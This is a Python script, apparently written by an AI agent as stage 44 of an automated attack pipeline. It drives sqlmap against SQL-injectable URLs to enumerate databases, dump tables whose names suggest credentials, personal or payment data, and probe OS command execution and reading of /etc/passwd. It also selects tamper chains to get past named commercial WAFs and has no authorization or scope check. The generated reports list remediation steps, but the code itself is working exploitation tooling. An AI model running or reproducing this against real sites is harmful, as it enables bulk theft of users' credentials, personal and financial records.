#!/usr/bin/env python3
"""
Task 44: SQLMap Deep SQL Injection Exploitation - AI Brain
==========================================================

Takes confirmed/possible SQLi from Task 43 Ghauri and performs
DEEP exploitation with SQLMap:
- Database enumeration
- Table enumeration
- Sensitive data extraction
- OS command testing

Author: Jules AI Agent
Mode: DEEP EXPLOITATION - Full database compromise
"""

import os
import sys
import json
import subprocess
import re
import hashlib
import logging
import argparse
import csv
import time
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class ExploitTarget:
    """Target for SQLMap exploitation."""
    url: str
    host: str
    priority: int
    technique: Optional[str] = None
    db_type: Optional[str] = None
    waf_type: Optional[str] = None
    from_ghauri: bool = False


@dataclass
class DatabaseInfo:
    """Information about a discovered database."""
    name: str
    tables: List[str] = field(default_factory=list)
    sensitive_tables: List[str] = field(default_factory=list)


@dataclass 
class ExtractionResult:
    """Result of data extraction."""
    database: str
    table: str
    row_count: int
    columns: List[str]
    has_credentials: bool = False
    has_pii: bool = False
    has_financial: bool = False
    dump_file: Optional[str] = None


@dataclass
class ExploitResult:
    """Complete exploitation result for a target."""
    url: str
    status: str  # exploited, partial, failed
    technique: Optional[str] = None
    db_type: Optional[str] = None
    databases: List[DatabaseInfo] = field(default_factory=list)
    extractions: List[ExtractionResult] = field(default_factory=list)
    os_command: bool = False
    file_read: bool = False
    error: Optional[str] = None
    exploit_time: float = 0.0


# =============================================================================
# SENSITIVE DATA PATTERNS
# =============================================================================

SENSITIVE_TABLE_PATTERNS = [
    # Authentication
    r'user', r'admin', r'account', r'member',
    r'login', r'auth', r'session', r'token',
    r'credential', r'password', r'secret',
    # Personal Data
    r'customer', r'client', r'person', r'profile',
    r'employee', r'staff', r'contact',
    # Financial
    r'payment', r'transaction', r'order',
    r'billing', r'invoice', r'credit',
    r'card', r'bank', r'balance',
    # Config
    r'config', r'setting', r'option',
    r'key', r'api',
]

SENSITIVE_COLUMN_PATTERNS = [
    r'password', r'passwd', r'pwd', r'hash',
    r'token', r'secret', r'key', r'api_key',
    r'email', r'phone', r'ssn', r'dob', r'address',
    r'credit', r'card', r'cvv', r'expir',
    r'salt', r'auth', r'session',
]


# =============================================================================
# TARGET LOADER
# =============================================================================

class TargetLoader:
    """Load exploitation targets from Task 43 Ghauri output."""
    
    def __init__(self, workspace: Path):
        self.workspace = workspace
        
    def load_targets(self) -> List[ExploitTarget]:
        """Load all targets from Ghauri output."""
        targets = []
        
        # Priority 1: Ghauri confirmed vulnerable
        vuln_file = self.workspace / 'outputs' / 'sqli' / 'ghauri_vulnerable.txt'
        if vuln_file.exists():
            targets.extend(self._load_from_file(vuln_file, priority=100, from_ghauri=True))
            logger.info(f"Loaded {len(targets)} confirmed vulnerable from Ghauri")
        
        # Priority 2: JSON with metadata (has technique/db info)
        json_file = self.workspace / 'outputs' / 'sqli' / 'sqlmap_priority_targets.json'
        if json_file.exists():
            json_targets = self._load_from_json(json_file)
            # Don't duplicate already loaded URLs
            existing = {t.url for t in targets}
            for t in json_targets:
                if t.url not in existing:
                    targets.append(t)
            logger.info(f"Loaded {len(json_targets)} targets from JSON")
        
        # Priority 3: Possible vulnerable (lower priority)
        poss_file = self.workspace / 'outputs' / 'sqli' / 'ghauri_possible.txt'
        if poss_file.exists():
            existing = {t.url for t in targets}
            poss_targets = self._load_from_file(poss_file, priority=50, from_ghauri=False)
            for t in poss_targets:
                if t.url not in existing:
                    targets.append(t)
            logger.info(f"Loaded {len(poss_targets)} possible targets")
        
        # Sort by priority
        targets.sort(key=lambda t: t.priority, reverse=True)
        
        return targets
    
    def _load_from_file(self, path: Path, priority: int, from_ghauri: bool) -> List[ExploitTarget]:
        """Load targets from simple URL file."""
        targets = []
        try:
            with open(path, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url and url.startswith('http'):
                        parsed = urlparse(url)
                        targets.append(ExploitTarget(
                            url=url,
                            host=parsed.netloc,
                            priority=priority,
                            from_ghauri=from_ghauri
                        ))
        except Exception as e:
            logger.warning(f"Error loading {path}: {e}")
        return targets
    
    def _load_from_json(self, path: Path) -> List[ExploitTarget]:
        """Load targets from JSON with metadata."""
        targets = []
        try:
            with open(path, 'r') as f:
                data = json.load(f)
            
            for item in data:
                url = item.get('url', '')
                if not url:
                    continue
                
                parsed = urlparse(url)
                
                # Map Ghauri technique to SQLMap technique string
                tech = item.get('technique', '')
                technique = self._map_technique(tech)
                
                targets.append(ExploitTarget(
                    url=url,
                    host=parsed.netloc,
                    priority=item.get('priority', 1) * 10 + 50,
                    technique=technique,
                    db_type=item.get('db_type'),
                    from_ghauri=True
                ))
        except Exception as e:
            logger.warning(f"Error loading JSON {path}: {e}")
        return targets
    
    def _map_technique(self, ghauri_tech: str) -> Optional[str]:
        """Map Ghauri technique name to SQLMap technique string."""
        if not ghauri_tech:
            return None
        
        tech_lower = ghauri_tech.lower()
        
        # SQLMap technique codes: B=Boolean, E=Error, U=Union, S=Stacked, T=Time
        if 'boolean' in tech_lower:
            return 'B'
        elif 'error' in tech_lower:
            return 'E'
        elif 'union' in tech_lower:
            return 'U'
        elif 'stacked' in tech_lower:
            return 'S'
        elif 'time' in tech_lower:
            return 'T'
        
        return None


# =============================================================================
# WAF HANDLER
# =============================================================================

class WAFHandler:
    """Handle WAF bypass configurations."""
    
    TAMPER_CHAINS = {
        'cloudflare': 'between,randomcase,space2comment,charencode',
        'akamai': 'charencode,chardoubleencode,space2plus,between',
        'aws': 'apostrophemask,base64encode,between,randomcase',
        'imperva': 'modsecurityversioned,space2morehash,between',
        'incapsula': 'modsecurityversioned,space2morehash',
        'f5': 'percentage,charencode,randomcomments,space2mssqlblank',
        'modsecurity': 'modsecurityzeroversioned,space2mysqldash,between',
        'default': 'between,randomcase,space2comment',
    }
    
    def __init__(self, workspace: Path):
        self.workspace = workspace
        self.host_waf: Dict[str, str] = {}
        self._load_waf_results()
    
    def _load_waf_results(self):
        """Load WAF results from Task 32."""
        waf_file = self.workspace / 'outputs' / 'waf' / 'waf_results.json'
        if waf_file.exists():
            try:
                with open(waf_file, 'r') as f:
                    data = json.load(f)
                
                if isinstance(data, dict):
                    self.host_waf = data
                elif isinstance(data, list):
                    for item in data:
                        host = item.get('host', item.get('url', ''))
                        waf = item.get('waf', '')
                        if host and waf:
                            self.host_waf[host] = waf.lower()
            except:
                pass
    
    def get_tamper_chain(self, host: str) -> str:
        """Get tamper script chain for host."""
        waf = self.host_waf.get(host, '').lower()
        
        for waf_name, chain in self.TAMPER_CHAINS.items():
            if waf_name in waf:
                return chain
        
        return self.TAMPER_CHAINS['default']


# =============================================================================
# SQLMAP EXPLOITER
# =============================================================================

class SQLMapExploiter:
    """
    Deep SQL injection exploitation with SQLMap.
    """
    
    BATCH_TIME_LIMIT = 540  # 9 minutes
    
    def __init__(self, workspace: Path, output_dir: Path, temp_dir: Path, skip_os: bool = False):
        self.workspace = workspace
        self.output_dir = output_dir
        self.temp_dir = temp_dir
        self.skip_os = skip_os
        
        # Create directories
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        self.dumps_dir = self.output_dir / 'sqlmap_dumps'
        self.dumps_dir.mkdir(parents=True, exist_ok=True)
        (self.workspace / 'outputs' / 'vulnerabilities').mkdir(parents=True, exist_ok=True)
        
        # Load intelligence
        self.waf_handler = WAFHandler(workspace)
        
        # Results
        self.results: List[ExploitResult] = []
        
        # Checkpoint
        self.checkpoint_file = self.temp_dir / 'checkpoint.json'
        
    def exploit_all(self, targets: List[ExploitTarget], resume: bool = False):
        """Exploit all targets."""
        logger.info("=" * 60)
        logger.info("STARTING SQLMAP DEEP EXPLOITATION")
        logger.info("=" * 60)
        
        # Load checkpoint if resuming
        start_idx = 0
        if resume:
            checkpoint = self._load_checkpoint()
            start_idx = checkpoint.get('last_completed', 0)
            logger.info(f"[RESUME] Starting from index {start_idx}")
        
        total = len(targets)
        batch_start = time.time()
        
        for i, target in enumerate(targets[start_idx:], start=start_idx):
            # Check time limit
            elapsed = time.time() - batch_start
            if elapsed > self.BATCH_TIME_LIMIT:
                logger.info(f"[BATCH] Time limit reached at {i}/{total}")
                self._save_checkpoint(i)
                break
            
            logger.info(f"\n[{i+1}/{total}] EXPLOITING: {target.url[:80]}...")
            
            # Enrich with WAF info
            target.waf_type = self.waf_handler.host_waf.get(target.host)
            
            # Exploit
            result = self._exploit_single(target)
            self.results.append(result)
            
            # Report status
            if result.status == 'exploited':
                logger.info(f"  [SUCCESS] {len(result.databases)} DBs, {len(result.extractions)} dumps")
                self._write_vuln_report(result)
                if result.extractions:
                    self._write_data_leak_reports(result)
            elif result.status == 'partial':
                logger.info(f"  [PARTIAL] SQLi confirmed but limited extraction")
            else:
                logger.info(f"  [FAILED] {result.error or 'No SQLi'}")
            
            # Save checkpoint
            self._save_checkpoint(i + 1)
        
        # Final summary
        self._save_results()
        self._generate_nosqlmap_targets(targets)
        
        logger.info("\n" + "=" * 60)
        logger.info("EXPLOITATION COMPLETE")
        exploited = sum(1 for r in self.results if r.status == 'exploited')
        partial = sum(1 for r in self.results if r.status == 'partial')
        logger.info(f"  Exploited: {exploited}")
        logger.info(f"  Partial:   {partial}")
        logger.info(f"  Failed:    {len(self.results) - exploited - partial}")
        logger.info("=" * 60)
    
    def _exploit_single(self, target: ExploitTarget) -> ExploitResult:
        """Exploit single target through all phases."""
        start_time = time.time()
        
        result = ExploitResult(
            url=target.url,
            status='failed'
        )
        
        # Phase 1: Enumerate databases
        databases = self._enumerate_dbs(target)
        if not databases:
            result.error = 'No databases found'
            result.exploit_time = time.time() - start_time
            return result
        
        result.databases = databases
        result.status = 'partial'
        
        # Phase 2 & 3: For each database, enumerate tables and dump sensitive ones
        for db_info in databases:
            # Get tables
            tables = self._enumerate_tables(target, db_info.name)
            db_info.tables = tables
            
            # Find sensitive tables
            sensitive = [t for t in tables if self._is_sensitive_table(t)]
            db_info.sensitive_tables = sensitive
            
            # Dump sensitive tables
            for table in sensitive[:5]:  # Limit to 5 most sensitive per DB
                extraction = self._dump_table(target, db_info.name, table)
                if extraction:
                    result.extractions.append(extraction)
        
        if result.extractions:
            result.status = 'exploited'
        
        # Phase 4: Test OS access (if not skipped)
        if not self.skip_os and target.from_ghauri:
            result.os_command = self._test_os_command(target)
            result.file_read = self._test_file_read(target)
        
        result.exploit_time = time.time() - start_time
        return result
    
    def _enumerate_dbs(self, target: ExploitTarget) -> List[DatabaseInfo]:
        """Phase 1: Enumerate databases."""
        cmd = ['sqlmap', '-u', target.url, '--batch', '--dbs']
        
        # Add technique if known from Ghauri
        if target.technique:
            cmd.extend(['--technique', target.technique])
        
        # Add DBMS if known
        if target.db_type:
            cmd.extend(['--dbms', target.db_type])
        
        # Add WAF bypass
        tamper = self.waf_handler.get_tamper_chain(target.host)
        cmd.extend(['--tamper', tamper])
        
        # Timeout and level
        cmd.extend(['--timeout', '30', '--level', '3', '--risk', '3'])
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,  # 5 minutes for DB enum
                cwd=str(self.workspace)
            )
            
            output = proc.stdout + proc.stderr
            
            # Parse databases from output
            databases = []
            db_match = re.findall(r'\[\*\]\s+(\w+)', output)
            available_match = re.findall(r'available databases\s*\[(\d+)\]:', output, re.IGNORECASE)
            
            if available_match:
                # Look for DB names after "available databases"
                db_section = re.search(r'available databases.*?:\s*(.*?)(?:\[|$)', output, re.DOTALL | re.IGNORECASE)
                if db_section:
                    db_names = re.findall(r'\[\*\]\s+(\S+)', db_section.group(1))
                    databases = [DatabaseInfo(name=db) for db in db_names if db]
            
            if not databases and db_match:
                databases = [DatabaseInfo(name=db) for db in db_match if db and db not in ['INFO', 'WARNING', 'CRITICAL']]
            
            return databases
            
        except subprocess.TimeoutExpired:
            logger.warning("  DB enumeration timed out")
            return []
        except FileNotFoundError:
            logger.error("SQLMap not installed!")
            return []
        except Exception as e:
            logger.warning(f"  DB enum error: {e}")
            return []
    
    def _enumerate_tables(self, target: ExploitTarget, database: str) -> List[str]:
        """Phase 2: Enumerate tables in database."""
        cmd = [
            'sqlmap', '-u', target.url,
            '--batch',
            '-D', database,
            '--tables',
            '--timeout', '30'
        ]
        
        if target.technique:
            cmd.extend(['--technique', target.technique])
        if target.db_type:
            cmd.extend(['--dbms', target.db_type])
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,
                cwd=str(self.workspace)
            )
            
            output = proc.stdout + proc.stderr
            
            # Parse tables
            tables = []
            table_section = re.search(r'tables:\s*(.*?)(?:\[|$)', output, re.DOTALL | re.IGNORECASE)
            if table_section:
                table_names = re.findall(r'\|\s+(\S+)\s+\|', table_section.group(1))
                tables = [t for t in table_names if t and t != 'Table']
            
            return tables
            
        except:
            return []
    
    def _dump_table(self, target: ExploitTarget, database: str, table: str) -> Optional[ExtractionResult]:
        """Phase 3: Dump table data."""
        # Create dump directory
        url_hash = hashlib.md5(target.url.encode()).hexdigest()[:8]
        dump_dir = self.dumps_dir / url_hash
        dump_dir.mkdir(exist_ok=True)
        
        dump_file = dump_dir / f"{database}_{table}.csv"
        
        cmd = [
            'sqlmap', '-u', target.url,
            '--batch',
            '-D', database,
            '-T', table,
            '--dump',
            '--dump-format', 'CSV',
            '--output-dir', str(dump_dir),
            '--timeout', '30',
            '--threads', '5'
        ]
        
        if target.technique:
            cmd.extend(['--technique', target.technique])
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600,  # 10 minutes for dump
                cwd=str(self.workspace)
            )
            
            output = proc.stdout + proc.stderr
            
            # Check if dump was successful
            if 'dumped' in output.lower() or 'entries' in output.lower():
                # Find the actual dump file
                actual_dump = None
                for f in dump_dir.rglob('*.csv'):
                    if table.lower() in f.name.lower():
                        actual_dump = f
                        break
                
                # Parse row count
                row_match = re.search(r'(\d+)\s+entries', output)
                row_count = int(row_match.group(1)) if row_match else 0
                
                # Parse columns
                col_match = re.search(r'columns?.*?:\s*\[([^\]]+)\]', output, re.IGNORECASE)
                columns = []
                if col_match:
                    columns = [c.strip() for c in col_match.group(1).split(',')]
                
                # Detect sensitive data types
                has_creds = any(self._is_sensitive_column(c) for c in columns if 'pass' in c.lower() or 'hash' in c.lower())
                has_pii = any(self._is_sensitive_column(c) for c in columns if any(p in c.lower() for p in ['email', 'phone', 'ssn', 'address']))
                has_financial = any(self._is_sensitive_column(c) for c in columns if any(p in c.lower() for p in ['card', 'credit', 'payment', 'bank']))
                
                return ExtractionResult(
                    database=database,
                    table=table,
                    row_count=row_count,
                    columns=columns,
                    has_credentials=has_creds,
                    has_pii=has_pii,
                    has_financial=has_financial,
                    dump_file=str(actual_dump) if actual_dump else None
                )
        except:
            pass
        
        return None
    
    def _test_os_command(self, target: ExploitTarget) -> bool:
        """Phase 4: Test OS command execution (safe test only)."""
        cmd = [
            'sqlmap', '-u', target.url,
            '--batch',
            '--os-cmd', 'whoami',
            '--timeout', '30'
        ]
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
                cwd=str(self.workspace)
            )
            
            output = proc.stdout + proc.stderr
            return 'command standard output' in output.lower() or 'os shell' in output.lower()
        except:
            return False
    
    def _test_file_read(self, target: ExploitTarget) -> bool:
        """Phase 4: Test file read capability."""
        cmd = [
            'sqlmap', '-u', target.url,
            '--batch',
            '--file-read', '/etc/passwd',
            '--timeout', '30'
        ]
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
                cwd=str(self.workspace)
            )
            
            output = proc.stdout + proc.stderr
            return 'root:' in output or 'file saved' in output.lower()
        except:
            return False
    
    def _is_sensitive_table(self, table: str) -> bool:
        """Check if table is sensitive."""
        table_lower = table.lower()
        return any(re.search(pattern, table_lower) for pattern in SENSITIVE_TABLE_PATTERNS)
    
    def _is_sensitive_column(self, column: str) -> bool:
        """Check if column is sensitive."""
        col_lower = column.lower()
        return any(re.search(pattern, col_lower) for pattern in SENSITIVE_COLUMN_PATTERNS)
    
    def _write_vuln_report(self, result: ExploitResult):
        """Write vulnerability report."""
        vuln_dir = self.workspace / 'outputs' / 'vulnerabilities'
        vuln_id = hashlib.md5(result.url.encode()).hexdigest()[:8]
        report_path = vuln_dir / f"SQLI-SQLMAP-{vuln_id}-CRITICAL.md"
        
        parsed = urlparse(result.url)
        
        # Build database section
        db_section = ""
        for db in result.databases:
            db_section += f"\n### {db.name}\n"
            db_section += f"- Tables: {len(db.tables)}\n"
            if db.sensitive_tables:
                db_section += f"- **Sensitive Tables**: {', '.join(db.sensitive_tables)}\n"
        
        # Build extraction section
        extract_section = ""
        if result.extractions:
            extract_section = "\n## Data Extracted\n\n"
            extract_section += "| Database | Table | Rows | Contains |\n"
            extract_section += "|----------|-------|------|----------|\n"
            for ex in result.extractions:
                contains = []
                if ex.has_credentials:
                    contains.append("ðŸ”‘ Credentials")
                if ex.has_pii:
                    contains.append("ðŸ‘¤ PII")
                if ex.has_financial:
                    contains.append("ðŸ’³ Financial")
                extract_section += f"| {ex.database} | {ex.table} | {ex.row_count} | {', '.join(contains) or 'Data'} |\n"
        
        report = f"""# SQL Injection Exploitation: SQLI-SQLMAP-{vuln_id}

## Summary
| Field | Value |
|-------|-------|
| **ID** | SQLI-SQLMAP-{vuln_id} |
| **URL** | {result.url} |
| **Host** | {parsed.netloc} |
| **Status** | {result.status.upper()} |
| **Databases** | {len(result.databases)} |
| **Extractions** | {len(result.extractions)} |
| **OS Command** | {'YES âš ï¸' if result.os_command else 'No'} |
| **File Read** | {'YES âš ï¸' if result.file_read else 'No'} |
| **Exploit Time** | {result.exploit_time:.1f}s |
| **Severity** | CRITICAL |
| **Discovered** | {datetime.now().isoformat()} |

## Databases Found
{db_section}
{extract_section}

## Impact

This SQL injection allows:
- **Complete database access**: Read all data in {len(result.databases)} database(s)
{'- **OS Command Execution**: Execute system commands on server' if result.os_command else ''}
{'- **File Read**: Read arbitrary files from server filesystem' if result.file_read else ''}
- **Data Exfiltration**: {sum(e.row_count for e in result.extractions)} rows extracted

## Dump Files

```
{self.dumps_dir / hashlib.md5(result.url.encode()).hexdigest()[:8]}/
```

## Reproduction

```bash
# Enumerate databases
sqlmap -u "{result.url}" --batch --dbs

# Dump specific table
sqlmap -u "{result.url}" --batch -D {{db}} -T {{table}} --dump
```

## Recommendations

1. **IMMEDIATE**: Take application offline for remediation
2. **IMMEDIATE**: Implement parameterized queries
3. **SHORT-TERM**: Conduct credential rotation
4. **SHORT-TERM**: Notify affected users
5. **LONG-TERM**: Implement WAF with SQLi rules
"""
        
        with open(report_path, 'w') as f:
            f.write(report)
        
        logger.info(f"  [REPORT] {report_path.name}")
    
    def _write_data_leak_reports(self, result: ExploitResult):
        """Write data leak reports for extracted data."""
        vuln_dir = self.workspace / 'outputs' / 'vulnerabilities'
        
        for extraction in result.extractions:
            if extraction.has_credentials or extraction.has_pii or extraction.has_financial:
                leak_id = hashlib.md5(f"{result.url}_{extraction.table}".encode()).hexdigest()[:8]
                report_path = vuln_dir / f"DATA-LEAK-{leak_id}-CRITICAL.md"
                
                data_types = []
                if extraction.has_credentials:
                    data_types.append("Credentials")
                if extraction.has_pii:
                    data_types.append("PII")
                if extraction.has_financial:
                    data_types.append("Financial")
                
                report = f"""# Data Leak: DATA-LEAK-{leak_id}

## Summary
| Field | Value |
|-------|-------|
| **ID** | DATA-LEAK-{leak_id} |
| **Source** | SQL Injection |
| **URL** | {result.url} |
| **Database** | {extraction.database} |
| **Table** | {extraction.table} |
| **Records** | {extraction.row_count} rows |
| **Data Types** | {', '.join(data_types)} |
| **Severity** | CRITICAL |

## Columns Exposed

{chr(10).join(f"- `{col}`" for col in extraction.columns)}

## Dump Location

```
{extraction.dump_file or 'See dumps directory'}
```

## Required Actions

1. **Breach notification** required under GDPR/CCPA if PII
2. **Credential rotation** required if passwords exposed
3. **Card replacement** required if financial data
4. **Forensic investigation** to determine extent
"""
                
                with open(report_path, 'w') as f:
                    f.write(report)
    
    def _load_checkpoint(self) -> Dict:
        """Load checkpoint."""
        if self.checkpoint_file.exists():
            try:
                with open(self.checkpoint_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {}
    
    def _save_checkpoint(self, last_completed: int):
        """Save checkpoint."""
        checkpoint = {
            'last_completed': last_completed,
            'timestamp': datetime.now().isoformat(),
        }
        with open(self.checkpoint_file, 'w') as f:
            json.dump(checkpoint, f, indent=2)
    
    def _save_results(self):
        """Save all results."""
        # Confirmed vulnerable
        confirmed_file = self.output_dir / 'sqlmap_confirmed.txt'
        with open(confirmed_file, 'w') as f:
            for r in self.results:
                if r.status == 'exploited':
                    f.write(f"{r.url}\n")
        
        # Full JSON
        full_results = {
            'scan_time': datetime.now().isoformat(),
            'total': len(self.results),
            'exploited': sum(1 for r in self.results if r.status == 'exploited'),
            'results': [
                {
                    'url': r.url,
                    'status': r.status,
                    'databases': [{'name': db.name, 'tables': len(db.tables)} for db in r.databases],
                    'extractions': [
                        {
                            'db': e.database,
                            'table': e.table,
                            'rows': e.row_count,
                            'has_credentials': e.has_credentials,
                            'has_pii': e.has_pii,
                        }
                        for e in r.extractions
                    ],
                    'os_command': r.os_command,
                    'file_read': r.file_read,
                }
                for r in self.results
            ]
        }
        
        results_file = self.output_dir / 'sqlmap_full_results.json'
        with open(results_file, 'w') as f:
            json.dump(full_results, f, indent=2)
        
        logger.info(f"[SAVE] Results saved to {self.output_dir}")
    
    def _generate_nosqlmap_targets(self, targets: List[ExploitTarget]):
        """Generate targets for NoSQLMap (Task 45) - MongoDB endpoints that failed SQL."""
        nosql_targets = []
        
        for r in self.results:
            if r.status == 'failed':
                # Check if might be MongoDB
                url_lower = r.url.lower()
                if any(x in url_lower for x in ['mongo', 'nosql', 'json', 'api', 'graphql']):
                    nosql_targets.append(r.url)
        
        if nosql_targets:
            nosql_file = self.output_dir / 'nosqlmap_targets.txt'
            with open(nosql_file, 'w') as f:
                for url in nosql_targets:
                    f.write(f"{url}\n")
            logger.info(f"[NOSQL] Generated {len(nosql_targets)} targets for Task 45")


# =============================================================================
# MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Task 44: SQLMap Deep SQL Injection Exploitation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    parser.add_argument('--workspace', required=True, help='Path to workspace root')
    parser.add_argument('--output', default='outputs/sqli', help='Output directory')
    parser.add_argument('--temp', default='temp/task44', help='Temp directory')
    parser.add_argument('--resume', action='store_true', help='Resume from checkpoint')
    parser.add_argument('--max-targets', type=int, default=0, help='Max targets (0=all)')
    parser.add_argument('--skip-os', action='store_true', help='Skip OS command tests')
    
    args = parser.parse_args()
    
    workspace = Path(args.workspace)
    output_dir = workspace / args.output
    temp_dir = workspace / args.temp
    
    # Load targets from Task 43
    loader = TargetLoader(workspace)
    targets = loader.load_targets()
    
    if not targets:
        logger.error("No targets found! Run Task 43 (Ghauri) first.")
        sys.exit(1)
    
    logger.info(f"Loaded {len(targets)} targets from Task 43")
    
    # Limit if specified
    if args.max_targets > 0:
        targets = targets[:args.max_targets]
        logger.info(f"Limited to {args.max_targets} targets")
    
    # Exploit
    exploiter = SQLMapExploiter(workspace, output_dir, temp_dir, args.skip_os)
    exploiter.exploit_all(targets, resume=args.resume)


if __name__ == "__main__":
    main()
